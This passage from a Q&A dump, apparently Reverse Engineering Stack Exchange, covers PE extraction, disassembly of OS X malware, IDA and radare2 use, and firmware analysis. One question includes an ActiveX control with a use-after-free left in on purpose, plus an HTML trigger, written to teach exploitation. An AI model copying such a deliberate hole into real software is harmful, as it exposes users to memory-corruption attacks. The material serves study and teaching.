     005A0CBD    mov        edx,dword ptr [ebp-38]
     005A0CC0    mov        eax,dword ptr [ebp-0C]
     005A0CC3    call       Pos
     005A0CC8    test       eax,eax
    &gt;005A0CCA    jle        005A0CF8
     005A0CCC    lea        edx,[ebp-8]
     005A0CCF    xor        eax,eax
     005A0CD1    call       005A0A7C
     005A0CD6    movzx      eax,byte ptr ds:[5A0D78]; 0x3
     005A0CDD    push       eax
     005A0CDE    push       ebx
     005A0CDF    lea        edx,[ebp-3C]
     005A0CE2    mov        eax,dword ptr [ebp-4]
     005A0CE5    call       LowerCase
     005A0CEA    mov        eax,dword ptr [ebp-3C]
     005A0CED    mov        ecx,dword ptr [ebp-8]
     005A0CF0    mov        edx,dword ptr [ebp-0C]
     005A0CF3    call       StringReplace
     005A0CF8    lea        edx,[ebp-40]
     005A0CFB    mov        eax,dword ptr [ebx]
     005A0CFD    call       ExcludeTrailingPathDelimiter
     005A0D02    mov        edx,dword ptr [ebp-40]
     005A0D05    mov        eax,ebx
     005A0D07    call       @UStrAsg
</code></pre>

<p>is it possible to extract an executable inside another executable an d how?</p>
","<p>It is possible. Where is the embedded executable located? Based on my experience there are a couple of locations:</p>

<ul>
<li><strong>Overlay</strong>: If it is in overlay, just select it entirely from the ""MZ"" signature to the end and dump it. Try to open it in the debugger then to see if it is working. More about this can be found <a href=""https://reverseengineering.stackexchange.com/questions/2014/how-can-one-extract-the-appended-data-of-a-portable-executable"">here</a></li>
<li><strong>Resource</strong>: If the embedded file is part of the resource, just dump the appropriate resource using some tool like <a href=""https://www.aldeid.com/wiki/LordPE"" rel=""nofollow noreferrer"">LordPE</a></li>
<li><strong>Section</strong>: This is the most trickiest case if you are new to this. Locate the first byte of the embedded PE file (the ""MZ"" signature bytes). From there position at offset 0x150. There you have a 4 byte value which contains the <em>SizeOfImage</em>. The <em>SizeOfImage</em> field tells you how much memory space the PE file takes when loaded in memory. When you get that value, you can select that many bytes and dump them. This way you are sure that the entire embedded file will be dumped.</li>
</ul>

<p>NOTE: If the original file has overlay, it would be a good idea to copy that overlay to the embedded file once you extract it because it is possible that the dumped file will make use of the overlay data.</p>
","12035"
"Program with no dependencies","938","","<p>while reading the answers to <a href=""https://reverseengineering.stackexchange.com/q/2070/245"">Can I statically link (not import) the Windows system DLLs?</a> I came up with another question. So: </p>

<ol>
<li>Is there a way to write a program that has no dependencies (nothing is statically compiled too - it has <strong>only</strong> my code) and everything is resolved during run-time assuming that <code>kernel32.dll</code> will be loaded/mapped into the process no matter what?</li>
<li>Is my assumption about <code>kernel32.dll</code> correct?</li>
</ol>

<p>During run-time, I mean using the <code>PEB</code> structure.</p>
","<p>If you're asking about PE files, and by ""no dependencies"" you mean ""no statically imported DLLs"", then yes.</p>

<p>See <code>\yoda\NoImports.exe</code> in <a href=""https://corkami.googlecode.com/files/BinaryCorpus_v2.zip"">https://corkami.googlecode.com/files/BinaryCorpus_v2.zip</a> as an example.</p>
","2094"
"Is there any tool to quantitatively evaluate the difference of binary?","937","","<p>I know some binary diff tool like VBinDiff and others.</p>

<p>Currently I have a large number of binary, around 500.</p>

<p>So I am looking for a binary tool to quantitatively evaluate the difference of binaries..</p>

<p>Like evaluate the difference of binary 10 and binary 100 is 56%. Difference of binary 50 and binary 200 is 78%.</p>

<p>Is there any tool like this? </p>

<p>Thank you!</p>
","<p>Here is my solution.</p>

<ol>
<li><p>I use <a href=""http://rada.re"" rel=""nofollow""><code>radiff2</code></a> to find out all the difference 
between binaries.</p>

<pre><code>radiff2 binary1 binary2
</code></pre></li>
<li><p>Then <code>xxd</code> to convert binary into hex</p>

<pre><code>xxd -p  final
</code></pre></li>
<li><p>After that, <code>wc</code> to figure out the number of hex in one binary</p>

<pre><code>wc -c outputhex
wc -l newlineneedtodelete
</code></pre></li>
<li><p>Now I have the difference between two binaries and the total number of hex in each binary. A simple divide could figure out the percentage of difference as I want.</p></li>
</ol>
","3509"
"Automated Assembly/Disassemble library","934","","<p>I'm writing a handy reverse tool in C++ with manual assembling/disassembling shell, to automate my work!</p>

<p>I need an assembler library.
Is there any library, embedding in C++?</p>
","<p>Oleh Yuschuk released a light-weight open-source assembler library that you can download from <a href=""http://ollydbg.de/srcdescr.htm"" rel=""nofollow"">http://ollydbg.de/srcdescr.htm</a></p>

<blockquote>
  <p><strong>Assemble</strong></p>
  
  <p>Function Assemble(), as expected, converts command from ASCII
  form to binary 32 bit code.</p>
</blockquote>

<p>Example:</p>

<pre><code>  // Assemble one of the commands above. First try form with 32-bit immediate.
  pasm=""ADD [DWORD 475AE0],1"";
  printf(""%s:\n"",pasm);
  j=Assemble(pasm,0x400000,&amp;am,0,0,errtext);
  n=sprintf(s,""%3i  "",j);
  for (i=0; i&lt;j; i++) n+=sprintf(s+n,""%02X "",am.code[i]);
  if (j&lt;=0) sprintf(s+n,""  error=\""%s\"""",errtext);
  printf(""%s\n"",s);
</code></pre>
","4667"
"FEEDFACE in OSX malware","934","","<p>I was reverse engineering a piece of code in ""Crisis"" for fun and I encountered the following :-</p>

<pre><code>__INIT_STUB_hidden:00004B8F                 mov     eax, 8FE00000h
__INIT_STUB_hidden:00004B94
__INIT_STUB_hidden:00004B94 loc_4B94:                               
__INIT_STUB_hidden:00004B94                 mov     ebx, 41424344h
__INIT_STUB_hidden:00004B99                 cmp     dword ptr [eax], 0FEEDFACEh
__INIT_STUB_hidden:00004B9F                 jz      short loc_4BB9
__INIT_STUB_hidden:00004BA1                 add     eax, 1000h
__INIT_STUB_hidden:00004BA6                 cmp     eax, 8FFF1000h
__INIT_STUB_hidden:00004BAB                 jnz     short loc_4B94
</code></pre>

<p>What is supposed to happen here? Why is the presence of <code>FEEDFACE</code> expected at the address <code>8FFF0000</code> or <code>8FFF1000</code>? I understand that <code>feedface</code>/<code>feedfacf</code> are Mach-O magic numbers -- however why are they expected to be present at those addresses?</p>
","<p>It's the Mach-O header magic. From <code>mach-o/loader.h</code>:</p>

<pre><code>/* Constant for the magic field of the mach_header (32-bit architectures) */
#define MH_MAGIC        0xfeedface      /* the mach magic number */
#define MH_CIGAM        0xcefaedfe      /* NXSwapInt(MH_MAGIC) */
</code></pre>

<p>In OS X, the Mach-O header is often included as part of the <code>__TEXT</code> segment so it's mapped into memory. The code is searching for a Mach-O file mapped somewhere in that address range - probably some system library - possibly so it can search for a necessary function to call (enumerate Mach-O load commands to locate the symbol table, etc.).</p>
","1948"
"Use After Free - Example","934","","<p><strong>Use After Free</strong> bugs a getting more severe these days.</p>

<p>I'm planning to demonstrate Use After Free bug exploitation using <strong>VTable overwrite</strong>. So, I'm trying to create a <strong>ATL ActiveX Control</strong> which is vulnerable to Use After Free bug using <strong>Internet Explorer 9 or 10</strong>.</p>

<p>I'm having trouble to come up with a <strong>Use After Free vulnerable code</strong> that works. Does anyone has experience with this kind of bug and can anyone try to help me.</p>

<p>I'm trying too. If I'm able to get it working, I'll share it here:</p>

<pre><code>class User
{
  public:
    virtual void SetUsername() { }
};

class NewUser:public User
{
  char username[20];
  public:
    virtual void SetUserName(char* strUsername) { strcpy(username, strUsername); }
    virtual char* GetUserName() { return username; }
};

STDMETHODIMP CATLActivexControl::CreateUser(BSTR sUserName, DOUBLE* retVal)
{
  USES_CONVERSION;
  char *tmp = W2A(sUserName);
  NewUser *nuser = new NewUser;
  nuser-&gt;SetUserName(tmp);

  free(nuser);

  char *xyz = nuser-&gt;GetUserNameW();
  return S_OK;
}
</code></pre>

<p><strong>I worked on the above example and I have come up with a nicer solution which really triggers Use After Free.</strong></p>

<p><strong>C++ code</strong></p>

<pre><code>#include ""stdafx.h""
#include ""ATLStudentActiveXControl.h""

// Virtual Function defination
class User
{
public:
    virtual void Add(char* uName) = 0;
    virtual char* GetName() = 0;
};

class Student : public User
{
private:
    char s_name[30];

public:
    virtual void Add(char* uName) { strncpy(s_name, uName, sizeof(s_name)); }
    virtual char* GetName() { return s_name; }

};

Student *pStudent = new Student;

STDMETHODIMP CATLStudentActiveXControl::Add(BSTR sName)
{
    USES_CONVERSION;
    char *tStudent = W2A(sName);
    pStudent-&gt;Add(tStudent);
    return S_OK;
}

STDMETHODIMP CATLStudentActiveXControl::Delete()
{
    free(pStudent);
    return S_OK;
}

STDMETHODIMP CATLStudentActiveXControl::GetName(BSTR* sName)
{
    char *tStudent = pStudent-&gt;GetName();
    *sName = A2WBSTR(tStudent);
    return S_OK;
}
</code></pre>

<p><strong>HTML Code</strong></p>

<pre><code>&lt;HTML&gt;
&lt;HEAD&gt;
&lt;TITLE&gt;Use After Free - Test Page&lt;/TITLE&gt;
&lt;script language=""javascript"" type=""text/javascript""&gt;
    function UAF() {
        alert('Start');

        // Assign _studentActiveX variable to ATLStudentActiveXControl
        var _studentActiveX = document.getElementById(""ATLStudentActiveXControl"");

        // Add a student
        _studentActiveX.Add(""StudentName"");

        // Uncomment the below line to trigger Use After Free vulnerability
        // _studentActiveX.Delete();

        // Get the name of the added student
        var _studentName = _studentActiveX.GetName();
        alert(_studentName);

        // Delete the student
        _studentActiveX.Delete()

        alert('Done');
    }
&lt;/script&gt;
&lt;/HEAD&gt;
&lt;BODY&gt;
&lt;OBJECT ID=""ATLStudentActiveXControl"" CLASSID=""CLSID:9EACDFCF-1A2E-462E-9DF6-53E03936DB22""&gt;&lt;/OBJECT&gt;
&lt;div&gt;
    &lt;p&gt;Demonstrating &lt;b&gt;Use After Free&lt;/b&gt; vulnerability.&lt;/p&gt;
    &lt;input type=""button"" onclick=""UAF();"" value=""Use After Free"" /&gt;
&lt;/div&gt;
&lt;/BODY&gt;
&lt;/HTML&gt;
</code></pre>

<p>Please share your views. Thanks.</p>
","<p>The first thing that comes to my mind is for you to create a class with a few virtual methods, which will be used as the test subject. Then from your ActiveX control you'd expose methods that manipulate the variable, say:</p>

<ul>
<li>Method #1: Allocate the test object and keep the pointer in a static variable</li>
<li>Method #2: Call the virtual methods provided by the test object</li>
<li>Method #3: Free the test object instance, <strong>without setting the pointer to NULL</strong></li>
<li>Some means to allocate other things that would reuse the memory freed in the previous method</li>
</ul>

<p>Then whip up a basic script exercising the given methods: allocate, call the methods to make sure it works as designed, free the instance, allocate something else, call virtual methods again and crash the IE instance. ;-) Should do the trick.</p>
","4749"
"Loading multiple IDB files for debugging session","931","","<p>I can't seem to figure out if I can and how you load multiple idb files with notes into a debugging session?</p>

<p>Is there a method or plugin that allows me to load these idb's? What I am doing now is start the program make a memory snapshot and make notes that way. When I start the new debuggin session I rebase the dlls. </p>

<p>This does really not work well ;)</p>

<p>note, I currently only have IDA Basic.</p>
","<p>IDA can only work with one IDB at a time. You'll need to either work with all modules in one IDB, or use serveral IDBs/IDA instances and detach/attach to the process as necessary.</p>
","4583"
"Modifying a binary save-data file for a video game with a CRC/Checksum check","930","","<p>I recently overwrote the save game file of a video game that my girlfriend and I had been playing through. After trying to recover the file a few different ways (game didn't erase but overwrote the save file), I'm resigned to trying to rebuild the save data manually.</p>

<p>I've played with reverse engineering binary executables from crackmes.de in the past with Ollydbg, but this is different and I feel like I'm a bit out of my waters.</p>

<p>The game (Sonic All Stars Racing) uses a single .bin file to store records for four in-game accounts. Using a hex editor, pen and paper, I've begun to plot out the file structure and locate offsets for various records.</p>

<p>The problem I have is that whenever I make a modification to the file, same size or otherwise, the game declares the save file corrupted and fails to use it. I assume that this is because the game is implementing some form of CRC/checksum on the data to prevent using a corrupted file. (Aside: are CRC and checksum interchangeable terms?)</p>

<hr>

<p>The game saves the data to a file named <code>""ssr_save.bin""</code> which is responsible for four in-game profiles.</p>

<p>What I did was create four different save files by making a backup of the save file after  creating each profile.</p>

<p>Each file is largely the same. 727040 bytes large. The only difference seems to be the first 12 bytes (0x00 to 0x0B inclusive). These first twelve bytes are completely unique between the four files.</p>

<p>There does, however, appear to be more than one data object in that range as there are 3 bytes of zero in the centre of the 12.</p>

<pre><code>File 1: 19 8E 0B 60 13 00 00 00 F9 3E 00 B0
File 2: 93 7B 0F 36 13 00 00 00 B6 35 02 9B
File 3: 69 71 1B 14 13 00 00 00 A1 30 08 8A
File 4: D9 47 32 E8 13 00 00 00 D9 9B 13 74
</code></pre>

<p>What I'm trying to figure out is what these bytes represent and how I can manipulate them to let me modify the body of the save data and not throw the corruption error in the game.</p>

<p>Can anyone help me find out how the game is checksumming the file and reverse engineer the process so I can create a valid file?</p>

<p><a href=""https://dl.dropboxusercontent.com/u/303145/savefiles.zip"" rel=""nofollow"">Here is an archive of the four save-data files</a></p>

<p>Troy.</p>
","<p>This is quite hard question to answer due to variables within reverse engineering.</p>

<p>I would recommend you start off with:</p>

<ul>
<li>Start game</li>
<li>Get some coins or whatever is saved then save the game.</li>
<li>Restart the game and get more coins and save the game.</li>
<li>Replace the new save with your old file.</li>
<li>Does it load? See Answer 1. Otherwise, Answer 2.</li>
</ul>

<p><strong>Answer 1</strong>
Your modified versions of your game files are just in the incorrect format.
You will need to some reverse engineering of how the bytes are used within the game.
I'd recommend you breakpoint CreateFile and ReadFile and step through your debugger and see how each byte is been read. Ofcourse, this can become a massive task.</p>

<p><strong>Answer 2</strong>
The game file checksum could be stored somewhere on the file-system or registry to ensure data-integrity of the file. You could use tools such as Process Monitor to help you locate this file or you could set breakpoint on CreateFile and ReadFile and search for it yourself manually.
<a href=""http://technet.microsoft.com/en-gb/sysinternals/bb896645.aspx"" rel=""nofollow"">http://technet.microsoft.com/en-gb/sysinternals/bb896645.aspx</a></p>

<p>Let me know if you get answer 1 or 2 then I can expand my answer in more in-depth details of things you should look out for and so on.</p>

<p>I hope this will be a good starting point to your issue.</p>
","5825"
"Put encrypted code blocks back as unencrypted in IDA","930","","<p>So I have some encrypted data in this executable. IDA couldn't do much with it, so it defined it as arrays. Now I know how to decrypt this data, and it has some encrypted code. I could of course, put the encrypted data into some separate file, run the decryption on it, and then let IDA process it, but then it looses connection to the original executable.</p>

<p>Is it possible to replace the encrypted data 1:1 with the decrypted one, so I can let IDA process it, in the context of the executable?</p>
","<p>Depending on the layout of the binary, where the data you want to modify is and how complex the transformation is I would pick one of the following solutions:</p>

<ol>
<li><p>If the transformation is simple and can be trivially done in a hex editor using one of its built in operations I would open the original input file in the hex editor, run the transformation and then in IDA select File, Load File, Reload the Input file.</p></li>
<li><p>If the transformation is complex and/or results in a new segment being mapped I would create an IDC or IDAPython script which does the transformation for you. The <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/"" rel=""nofollow"">documentation for IDAPython</a> can be found on hex rays website. The <a href=""https://www.hex-rays.com/products/ida/support/idadoc/162.shtml"" rel=""nofollow"">documentation for IDC</a> can also be found on their website. They also have a small set of <a href=""https://www.hex-rays.com/products/ida/support/tutorials/idc/index.shtml"" rel=""nofollow"">IDC tutorials</a> on there. IDC functions you're particularly interested in are: <a href=""https://www.hex-rays.com/products/ida/support/idadoc/299.shtml"" rel=""nofollow"">AddSeg()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/1321.shtml"" rel=""nofollow"">Qword()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/252.shtml"" rel=""nofollow"">Dword()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/251.shtml"" rel=""nofollow"">Word()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/249.shtml"" rel=""nofollow"">Byte()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/679.shtml"" rel=""nofollow"">PatchDword()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/714.shtml"" rel=""nofollow"">PatchWord()</a>, <a href=""https://www.hex-rays.com/products/ida/support/idadoc/713.shtml"" rel=""nofollow"">PatchByte()</a>.</p></li>
</ol>
","2971"
"Method disassembly of Objective C Mach-O with Radare 2","929","","<p>Is is possible to retrieve the dissassembly of Objective-C methods declared in Mach-O files using Radare 2 ?</p>
","<p>Essentially, it's the following workflow:</p>

<pre><code>r2 -A /path/to/binary   // load the binary and perform initial analysis
afl                     // print function symbols
pdf @sym.of.interest    // disassemble
pdc @sym.of.interest    // ""decompile"" or generate pseudo code
</code></pre>

<p>Here is an example of how to disassemble a function of <a href=""https://github.com/gdbinit/MachOView"" rel=""nofollow noreferrer"">MachoViewer</a>:</p>

<pre><code>@0x4B6169:/$ r2 -A /Applications/MachOView.app/Contents/MacOS/MachOView 2&gt;/dev/null
 -- Run .dmm* to load the flags of the symbols of all modules loaded in the debugger
[0x100001da0]&gt; afl | grep sym.__MachOLayout_get
0x10000b252    4 49           sym.__MachOLayout_getSectionByIndex:_
0x10000b283    4 49           sym.__MachOLayout_getSection64ByIndex:_
0x10000b2b4    4 49           sym.__MachOLayout_getSymbolByIndex:_
0x10000b2e5    4 49           sym.__MachOLayout_getSymbol64ByIndex:_
0x10000b316    4 49           sym.__MachOLayout_getDylibByIndex:_
[0x100001da0]&gt; pdf @sym.__MachOLayout_getSymbolByIndex:_
            ;-- func.10000b2b4:
            ;-- method.MachOLayout.getSymbolByIndex::
╒ (fcn) sym.__MachOLayout_getSymbolByIndex:_ 49
│           0x10000b2b4      55             push rbp
│           0x10000b2b5      4889e5         mov rbp, rsp
│           0x10000b2b8      89d0           mov eax, edx
│           0x10000b2ba      488b151f760f.  mov rdx, qword [rip + 0xf761f] ; [0x1001028e0:8]=176 LEA sym._OBJC_IVAR___MachOLayout.symbols ; sym._OBJC_IVAR___MachOLayout.symbols
│           0x10000b2c1      488b0c17       mov rcx, qword [rdi + rdx]
│           0x10000b2c5      488b541708     mov rdx, qword [rdi + rdx + 8] ; [0x8:8]=0x280000003
│           0x10000b2ca      4829ca         sub rdx, rcx
│           0x10000b2cd      48c1fa03       sar rdx, 3
│           0x10000b2d1      4839d0         cmp rax, rdx
│       ┌─&lt; 0x10000b2d4      7306           jae 0x10000b2dc
│       │   0x10000b2d6      488b04c1       mov rax, qword [rcx + rax*8]
│      ┌──&lt; 0x10000b2da      eb07           jmp 0x10000b2e3
│      ││   ; JMP XREF from 0x10000b2d4 (sym.__MachOLayout_getSymbolByIndex:_)
│      │└─&gt; 0x10000b2dc      488d05e5fd0a.  lea rax, [rip + 0xafde5]   ; 0x1000bb0c8 ; sym.__MachOLayoutgetSymbolByIndex:_::notfound ; sym.__MachOLayoutgetSymbolByIndex:_::notfound
│      │    ; JMP XREF from 0x10000b2da (sym.__MachOLayout_getSymbolByIndex:_)
│      └──&gt; 0x10000b2e3      5d             pop rbp
╘           0x10000b2e4      c3             ret
[0x100001da0]&gt; quit
</code></pre>

<p>Generating some form of pseudo code (""decompiling"") works similarly through the ingeniously logic command input:</p>

<pre><code>[0x100001da0]&gt; pdc @sym.__MachOLayout_getSymbolByIndex:_
function sub.__MachOLayoutgetSymbolByIndex:_.notfound_2b4 () {
    loc_0x10000b2b4:

       push rbp
       rbp = rsp
       eax = edx
       rdx = qword sym._OBJC_IVAR___MachOLayout.symbols //[0x1001028e0:8]=176 ; ""__text""
       rcx = qword [rdi + rdx]
       rdx = qword [rdi + rdx + 8] //[0x8:8]=0x280000003
       rdx -= rcx
       rdx &gt;&gt;= 3
       var = rax - rdx
       jae 0x10000b2dc          //unlikely
       {
        loc_0x10000b2dc:

         //JMP XREF from 0x10000b2d4 (sub.__MachOLayoutgetSymbolByIndex:_.notfound_2b4)
           rax = [sym.__MachOLayoutgetSymbolByIndex:_::notfound] //method.__MachOLayoutgetSymbolByIndex:_.notfound ; 0x1000bb0c8 ; method.__MachOLayoutgetSymbolByIndex:_.notfound
       do
       {
            loc_0x10000b2e3:

             //JMP XREF from 0x10000b2da (sub.__MachOLayoutgetSymbolByIndex:_.notfound_2b4)
               pop rbp

           } while (?);
       } while (?);
      }
      return;

}
</code></pre>

<p>Inside <a href=""https://www.hopperapp.com/"" rel=""nofollow noreferrer"">hopper v4</a> you can do the same as follows:</p>

<pre><code>hopperv4 -e /Applications/MachOView.app/Contents/MacOS/MachOView
</code></pre>

<p>This opens hopper and you can click on the ""Proc."" tab, and search for the function. Once you click on it, you will see the following disassembly (radare2 1.5.0 0 @ darwin-x86-64 git.1.5.0, commit: HEAD build: 2017-05-31__14:31:32):</p>

<pre><code>000000010000b2b4         push       rbp                                         ; Objective C Implementation defined at 0x1000f5de8 (instance method), DATA XREF=0x1000f5de8
000000010000b2b5         mov        rbp, rsp
000000010000b2b8         mov        eax, edx
000000010000b2ba         mov        rdx, qword [_OBJC_IVAR_$_MachOLayout.symbols]
000000010000b2c1         mov        rcx, qword [rdi+rdx]
000000010000b2c5         mov        rdx, qword [rdi+rdx+8]
000000010000b2ca         sub        rdx, rcx
000000010000b2cd         sar        rdx, 0x3
000000010000b2d1         cmp        rax, rdx
000000010000b2d4         jae        loc_10000b2dc

000000010000b2d6         mov        rax, qword [rcx+rax*8]
000000010000b2da         jmp        loc_10000b2e3

                     loc_10000b2dc:
000000010000b2dc         lea        rax, qword [__ZZ32-[MachOLayout getSymbolByIndex:]E8notfound] ; CODE XREF=-[MachOLayout getSymbolByIndex:]+32

                     loc_10000b2e3:
000000010000b2e3         pop        rbp                                         ; CODE XREF=-[MachOLayout getSymbolByIndex:]+38
000000010000b2e4         ret
</code></pre>

<p>Clearly, the pseudo-code inside hopper is at this moment still quite better than what I could get inside radare2. The above disassembly in pseudo code inside hopper (v4.2.1) reads:</p>

<pre><code>struct nlist * -[MachOLayout getSymbolByIndex:](void * self, void * _cmd, unsigned int arg2) {
    rax = arg2;
    rcx = self-&gt;symbols;
    if (rax &lt; SAR(*(self + *_OBJC_IVAR_$_MachOLayout.symbols + 0x8) - rcx, 0x3)) {
            rax = *(rcx + rax * 0x8);
    }
    else {
            rax = -[MachOLayout getSymbolByIndex:]::notfound;
    }
    return rax;
}
</code></pre>
","14303"
"OCX methods execution monitoring","928","","<p>I have a OCX control which is loaded in Internet Explorer (used to show stream from IP camera). To see live video I have to properly connect to server etc. using methods of created object. The best idea will be to monitor which methods are called from IE. <strong>Is there any possibility to monitor these calls</strong> and parameters with for example plug-in for IE or some API monitor program?</p>

<p><img src=""https://i.stack.imgur.com/9Dy2r.png"" alt=""OCX information in OLEView"">
<img src=""https://i.stack.imgur.com/vNGuJ.png"" alt=""Methods details""></p>
","<p>You can use API Monitor available here: <a href=""http://www.rohitab.com/apimonitor"">http://www.rohitab.com/apimonitor</a>
As this is probably a custom OCX, you will have to write a custom headers file, you can this as an example: <a href=""http://www.rohitab.com/discuss/topic/39850-generate-headers-for-mscomm32ocx/"">http://www.rohitab.com/discuss/topic/39850-generate-headers-for-mscomm32ocx/</a></p>
","3622"
"What's the use of ""Segments Registers"" sub view of IDA Pro?","928","","<p>I am new user of IDA Pro. The version I am using is 6.8 demo.
I know conceptions of program segmentation and segment register. 
But, I am confused about why there are two views, ""Program Segmentation"" and ""Segment register""
Belew is snapshot of program segmentation view.
<img src=""https://i.stack.imgur.com/ZPdXd.png"" alt=""enter image description here"">
Belew is snapshot of program register view
<img src=""https://i.stack.imgur.com/eMa0z.gif"" alt=""enter image description here"">
As we can see the information of two views is almost duplicated.</p>
","<p>This was interesting when DOS was the operating system of choice, processors had 16 bits, and programs were larger than 64 KB. Those times, the content of segment registers changed a lot; programs had to use far jumps (that changed CS and IP) to jump to addresses more than 64 KB away, and they had to load a value into DS or ES first to access large data segments (or load <code>0x0040</code> into ES to access BIOS data structures and have access to the 'high resolution timer' which changed 18.2 times a second).</p>

<p>Here's part of the disassembly of an old 16 bit program:</p>

<p><img src=""https://i.stack.imgur.com/Nc3PN.png"" alt=""enter image description here""></p>

<p>Please note that there are three segment changes that change the assumption of IDA about the contents of the segments, and another one at <code>25EB</code> where <code>ES</code> is 'changed' to <code>seg130</code>, which isn't really a change, so there's no <code>assume</code> directive.</p>

<p>Here's the corresponding segment registers view:</p>

<p><img src=""https://i.stack.imgur.com/bh5wy.png"" alt=""enter image description here""></p>

<p>in which <code>15412</code> corresponds to <code>seg001:25B2</code>; if you click on that row in IDA, the program view will jump to that address. The following 3 'change points' correspond to the next addresses where the code actually changes a segment register value.</p>

<p>Those days, programs contained several code segments, and several data segments, so the program segmentation view had a lot to show as well:</p>

<p><img src=""https://i.stack.imgur.com/opPEb.png"" alt=""enter image description here""></p>

<p>you see there are many <code>CODE</code> segments and many <code>UNK</code>nown segments, only a small part of the whole program is shown. Each of these <code>CODE</code> segments used a different value for <code>CS</code>, which is why IDA creates a new segment register change entry for each new segment.</p>

<p>These days, unless you're disassembling kernel code, you won't see segment register changes at all, and even if you're disassembling the kernel, you'll have one code segment and one data segment, not many of them. So IDA just creates one segment from each section of the input file, and creates the corresponding change points, but there's no change point except the ones that are created for the segments. Which is why the views correspond to each other, and which is also why you're not interested in either of them in most cases.</p>
","9278"
"Does anyone know this encoding?","927","","<p>There is an interesting article on Phack:
<a href=""http://phrack.org/issues/69/15.html#article"" rel=""noreferrer"">http://phrack.org/issues/69/15.html#article</a></p>

<p>At the end of the article there is the source appended in a strange encoding. </p>

<pre><code>begin 664 hypervisor_for_rootkit.tar.gz
M'XL(`%?BS58``^P];7&gt;B2-;]U3ZG_P/K[LXQTU$!$&lt;R0S!Q4['C&amp;1!\U[&lt;PS
M/&lt;=%*)5I!`8P+],[_WUO%:!@0,U+)YUNJF,+U*U;5??]E@7,;VSD7.JNY8RG
M\'$LR_NH&gt;^57CUEH*`)-XV]&amp;J,:^P_**87F^4N$96A!&gt;T0S'5/A75/511Y%2
...
`
end
</code></pre>

<p>Does anyone know how to convert this back to the original archive?</p>
","<p>This seems to be <a href=""https://en.wikipedia.org/wiki/Uuencoding"">UUencoded</a> data.</p>
","13758"
"Origin of ""Hacker Protection Factor""","927","","<p><a href=""http://www.saikoa.com/dexguard"" rel=""nofollow"">Dexguard</a> claims a ""hacker protection factor"" of 35 without any explanation of where the number comes from or what it means. I figure the actual statement is meaningless, but I'm very curious to see who is assessing these protection factors. </p>

<p>A Google search didn't turn up anything, so I thought that the Dexguard authors probably made it up themselves. But <a href=""https://twitter.com/nflnfl/status/241442557580673024"" rel=""nofollow"">this Twitter post</a> implies that there are other ""hacker protection factors"", out there which 35 can be compared with. </p>

<p>Does anyone know what the deal with this is? Is it just more pointless puffery? Is there an actual group that is assigning these numbers?</p>
","<p>""Hacker Protection Factor"" is a geeky play of words on ""Sun Protection Factor"" -- how much longer can an application be attacked before being damaged. The numbers are based on empirical evidence (""<em>Based on our experience,...</em>""). I thought it was cute; it is not an industry standard, but it does serve as a simple indication that an application processed with ProGuard is more difficult to reverse-engineer than the original application, and an application processed with DexGuard is <em>a lot</em> more difficult to reverse-engineer.</p>

<p>(I am the developer of ProGuard and DexGuard)</p>
","2410"
"Reversing DLink DIR100 firmware","926","","<p>I'm trying to extract this firmware but I'm running into some issues. The first lecture of the firmware with binwalk shows this:</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
48          0x30        LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 992240 bytes
275832      0x43578     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 65011 bytes
312165      0x4C365     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 6425 bytes
314338      0x4CBE2     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 6198 bytes
316542      0x4D47E     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 11645 bytes
319496      0x4E008     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9923 bytes
322366      0x4EB3E     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 3981 bytes
323721      0x4F089     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1269 bytes
324228      0x4F284     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9785 bytes
327024      0x4FD70     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9717 bytes
329754      0x5081A     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 9957 bytes
332630      0x51356     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4544 bytes
334066      0x518F2     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 378 bytes
334305      0x519E1     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1019 bytes
334787      0x51BC3     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 12756 bytes
338395      0x529DB     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 16497 bytes
343482      0x53DBA     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 11019 bytes
347416      0x54D18     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 39577 bytes
358366      0x577DE     JPEG image data, JFIF standard  1.02
358907      0x579FB     JPEG image data, JFIF standard  1.02
359442      0x57C12     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 1787 bytes
361070      0x5826E     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 893 bytes
361902      0x585AE     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 637 bytes
362528      0x58820     JPEG image data, JFIF standard  1.02
363522      0x58C02     JPEG image data, JFIF standard  1.02
364963      0x591A3     JPEG image data, JFIF standard  1.01
376049      0x5BCF1     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 683 bytes
376714      0x5BF8A     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 761 bytes
377462      0x5C276     LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 225 bytes
